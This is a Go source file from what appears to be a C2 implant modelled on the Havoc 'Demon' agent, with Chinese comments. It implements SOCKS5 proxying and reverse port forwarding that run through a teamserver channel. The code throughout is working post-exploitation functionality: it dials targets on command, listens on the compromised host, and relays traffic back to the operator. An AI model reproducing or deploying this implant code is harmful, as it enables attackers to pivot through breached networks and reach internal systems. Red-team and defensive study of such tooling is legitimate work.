package main

import (
	"crypto/rand"
	"encoding/binary"
	"io"
	"net"
	"strconv"
	"sync"
	"time"
)

// SOCKS5 / 端口转发（COMMAND_SOCKET，2540）
//
// 与 Windows Demon 的协议一致：
//   SOCKS：teamserver 上跑 SOCKS5 服务端，客户端 CONNECT 时下发
//          [CONNECT][socketID][ATYP][host bytes][port u16]；
//          agent 连接目标并回 [CONNECT][success][id][errno]；
//          之后双向数据走 [READ][id][type][success][bytes]（agent→TS）与
//          [WRITE][id][bytes]（TS→agent）；[CLOSE][id] 关闭。
//   rportfwd：agent 在目标上监听，客户端连入后发 [OPEN][id][lcl][fwd]，
//          数据同样走 READ(type=CLIENT)/WRITE，由 teamserver 侧连 FwdAddr:FwdPort。
//
// 注意：teamserver -> agent 的任务数据是小端，agent -> teamserver 是大端。

const (
	sockCmdRPortFwdAdd    = 0x0
	sockCmdRPortFwdAddLcl = 0x1
	sockCmdRPortFwdList   = 0x2
	sockCmdRPortFwdClear  = 0x3
	sockCmdRPortFwdRemove = 0x4

	sockCmdOpen    = 0x10
	sockCmdRead    = 0x11
	sockCmdWrite   = 0x12
	sockCmdClose   = 0x13
	sockCmdConnect = 0x14

	sockTypeReversePortFwd = 0x1
	sockTypeReverseProxy   = 0x2
	sockTypeClient         = 0x3
)

type socketEntry struct {
	id       uint32
	typ      uint32
	conn     net.Conn
	listener net.Listener
	lclAddr  uint32
	lclPort  uint32
	fwdAddr  uint32
	fwdPort  uint32
	parentID uint32

	mu     sync.Mutex
	closed bool
}

var (
	sockMu    sync.Mutex
	sockTable = map[uint32]*socketEntry{}
)

func newSocketID() uint32 {
	var b [4]byte
	rand.Read(b[:])
	return binary.LittleEndian.Uint32(b[:]) & 0x7fffffff
}

func sockAdd(e *socketEntry) {
	sockMu.Lock()
	sockTable[e.id] = e
	sockMu.Unlock()
}

func sockGet(id uint32) *socketEntry {
	sockMu.Lock()
	defer sockMu.Unlock()
	return sockTable[id]
}

func sockDel(id uint32) {
	sockMu.Lock()
	delete(sockTable, id)
	sockMu.Unlock()
}

func (s *socketEntry) close() {
	s.mu.Lock()
	if s.closed {
		s.mu.Unlock()
		return
	}
	s.closed = true
	s.mu.Unlock()

	if s.conn != nil {
		_ = s.conn.Close()
	}
	if s.listener != nil {
		_ = s.listener.Close()
	}
	sockDel(s.id)
}

func ipFromUint32(v uint32) string {
	// common.IpStringToInt32 = little-endian 读取 4 字节
	return net.IPv4(byte(v), byte(v>>8), byte(v>>16), byte(v>>24)).String()
}

func joinHostPort(addr uint32, port uint32) string {
	return net.JoinHostPort(ipFromUint32(addr), strconv.Itoa(int(port)))
}

// ---------------------------------------------------------------------------
// 命令分发
// ---------------------------------------------------------------------------

func handleSocket(p *parser, req uint32) {
	sub := p.i32()
	switch sub {
	case sockCmdRPortFwdAdd:
		rportfwdAdd(p, req)
	case sockCmdRPortFwdList:
		rportfwdList(req)
	case sockCmdRPortFwdClear:
		rportfwdClear(req)
	case sockCmdRPortFwdRemove:
		rportfwdRemove(p, req)
	case sockCmdConnect:
		socketConnect(p, req)
	case sockCmdWrite:
		socketWrite(p, req)
	case sockCmdClose:
		socketClose(p, req)
	default:
		sendError(req, "socket: unsupported subcommand "+itoa(int(sub)))
	}
}

// ---------------------------------------------------------------------------
// rportfwd
// ---------------------------------------------------------------------------

func rportfwdAdd(p *parser, req uint32) {
	lclAddr := uint32(p.i32())
	lclPort := uint32(p.i32())
	fwdAddr := uint32(p.i32())
	fwdPort := uint32(p.i32())

	entry := &socketEntry{
		typ:     sockTypeReversePortFwd,
		lclAddr: lclAddr, lclPort: lclPort,
		fwdAddr: fwdAddr, fwdPort: fwdPort,
	}
	ln, err := net.Listen("tcp", joinHostPort(lclAddr, lclPort))
	if err != nil {
		out := newPacker()
		out.i32(sockCmdRPortFwdAdd)
		out.i32(0)
		out.i32(0)
		out.i32(int32(lclAddr))
		out.i32(int32(lclPort))
		out.i32(int32(fwdAddr))
		out.i32(int32(fwdPort))
		enqueue(cmdSocket, req, out.b)
		sendOutput(req, "rportfwd add failed: "+err.Error())
		return
	}

	entry.listener = ln
	entry.id = newSocketID()
	sockAdd(entry)

	out := newPacker()
	out.i32(sockCmdRPortFwdAdd)
	out.i32(1)
	out.i32(int32(entry.id))
	out.i32(int32(lclAddr))
	out.i32(int32(lclPort))
	out.i32(int32(fwdAddr))
	out.i32(int32(fwdPort))
	enqueue(cmdSocket, req, out.b)

	go acceptLoop(entry)
}

func acceptLoop(entry *socketEntry) {
	for {
		conn, err := entry.listener.Accept()
		if err != nil {
			return
		}
		client := &socketEntry{
			id:       newSocketID(),
			typ:      sockTypeClient,
			conn:     conn,
			lclAddr:  entry.lclAddr,
			lclPort:  entry.lclPort,
			fwdAddr:  entry.fwdAddr,
			fwdPort:  entry.fwdPort,
			parentID: entry.id,
		}
		sockAdd(client)

		open := newPacker()
		open.i32(sockCmdOpen)
		open.i32(int32(client.id))
		open.i32(int32(client.lclAddr))
		open.i32(int32(client.lclPort))
		open.i32(int32(client.fwdAddr))
		open.i32(int32(client.fwdPort))
		enqueue(cmdSocket, 0, open.b)

		go socketReadLoop(client)
	}
}

func rportfwdList(req uint32) {
	out := newPacker()
	out.i32(sockCmdRPortFwdList)

	sockMu.Lock()
	for _, e := range sockTable {
		if e.typ != sockTypeReversePortFwd {
			continue
		}
		out.i32(int32(e.id))
		out.i32(int32(e.lclAddr))
		out.i32(int32(e.lclPort))
		out.i32(int32(e.fwdAddr))
		out.i32(int32(e.fwdPort))
	}
	sockMu.Unlock()

	enqueue(cmdSocket, req, out.b)
}

func rportfwdRemove(p *parser, req uint32) {
	id := uint32(p.i32())
	e := sockGet(id)
	if e == nil {
		sendError(req, "rportfwd remove: socket not found")
		return
	}
	out := newPacker()
	out.i32(sockCmdRPortFwdRemove)
	out.i32(int32(e.id))
	out.i32(int32(e.typ))
	out.i32(int32(e.lclAddr))
	out.i32(int32(e.lclPort))
	out.i32(int32(e.fwdAddr))
	out.i32(int32(e.fwdPort))
	enqueue(cmdSocket, req, out.b)

	// 同时关闭该监听下已建立的客户端连接
	sockMu.Lock()
	var clients []*socketEntry
	for _, c := range sockTable {
		if c.parentID == id || c.id == id {
			clients = append(clients, c)
		}
	}
	sockMu.Unlock()
	for _, c := range clients {
		c.close()
	}
}

func rportfwdClear(req uint32) {
	sockMu.Lock()
	var all []*socketEntry
	for _, e := range sockTable {
		if e.typ == sockTypeReversePortFwd || e.typ == sockTypeClient {
			all = append(all, e)
		}
	}
	sockMu.Unlock()
	for _, e := range all {
		e.close()
	}
	out := newPacker()
	out.i32(sockCmdRPortFwdClear)
	out.i32(1)
	enqueue(cmdSocket, req, out.b)
}

// ---------------------------------------------------------------------------
// socks5 connect / write / close
// ---------------------------------------------------------------------------

func socketConnect(p *parser, req uint32) {
	socketID := uint32(p.i32())
	atyp := p.byte()
	hostBytes := p.bytes()
	port := p.u16()

	var host string
	switch atyp {
	case 1:
		if len(hostBytes) < 4 {
			sendConnectResult(req, socketID, false)
			return
		}
		host = net.IPv4(hostBytes[0], hostBytes[1], hostBytes[2], hostBytes[3]).String()
	case 3:
		host = string(hostBytes)
	case 4:
		host = net.IP(hostBytes).String()
	default:
		sendConnectResult(req, socketID, false)
		return
	}

	addr := net.JoinHostPort(host, strconv.Itoa(int(port)))
	conn, err := net.DialTimeout("tcp", addr, 10*time.Second)
	if err != nil {
		sendConnectResult(req, socketID, false)
		sendOutput(req, "socks connect "+addr+" failed: "+err.Error())
		return
	}

	entry := &socketEntry{id: socketID, typ: sockTypeReverseProxy, conn: conn}
	sockAdd(entry)
	sendConnectResult(req, socketID, true)
	go socketReadLoop(entry)
}

func sendConnectResult(req uint32, id uint32, ok bool) {
	out := newPacker()
	out.i32(sockCmdConnect)
	if ok {
		out.i32(1)
	} else {
		out.i32(0)
	}
	out.i32(int32(id))
	out.i32(0)
	enqueue(cmdSocket, req, out.b)
}

func socketWrite(p *parser, req uint32) {
	id := uint32(p.i32())
	data := p.bytes()
	e := sockGet(id)
	if e == nil || e.conn == nil {
		sendWriteError(req, id, sockTypeReverseProxy, 1)
		return
	}
	if _, err := e.conn.Write(data); err != nil {
		sendWriteError(req, id, e.typ, 1)
	}
}

func sendWriteError(req uint32, id uint32, typ uint32, code int32) {
	out := newPacker()
	out.i32(sockCmdWrite)
	out.i32(int32(id))
	out.i32(int32(typ))
	out.i32(0)
	out.i32(code)
	enqueue(cmdSocket, req, out.b)
}

func socketClose(p *parser, req uint32) {
	id := uint32(p.i32())
	if e := sockGet(id); e != nil {
		e.close()
	}
}

// socketReadLoop 把 socket 上的数据以 READ 包发回 teamserver。
func socketReadLoop(e *socketEntry) {
	buf := make([]byte, 32*1024)
	for {
		n, err := e.conn.Read(buf)
		if n > 0 {
			out := newPacker()
			out.i32(sockCmdRead)
			out.i32(int32(e.id))
			out.i32(int32(e.typ))
			out.i32(1)
			out.bytes(buf[:n])
			enqueue(cmdSocket, 0, out.b)
		}
		if err != nil {
			// teamserver 主动下发 CLOSE 时会关闭本地连接，这属于正常收尾，
			// 不要再回一个 READ 失败包（否则控制台会被 “Failed to read ...” 刷屏）。
			e.mu.Lock()
			closedByPeer := e.closed
			e.mu.Unlock()
			if !closedByPeer {
				if err == io.EOF {
					// 本地客户端正常断开：通知 teamserver 关闭转发目标连接，避免隧道悬挂
					out := newPacker()
					out.i32(sockCmdClose)
					out.i32(int32(e.id))
					out.i32(int32(e.typ))
					enqueue(cmdSocket, 0, out.b)
				} else {
					out := newPacker()
					out.i32(sockCmdRead)
					out.i32(int32(e.id))
					out.i32(int32(e.typ))
					out.i32(0)
					out.i32(1)
					enqueue(cmdSocket, 0, out.b)
				}
			}
			e.close()
			return
		}
	}
}
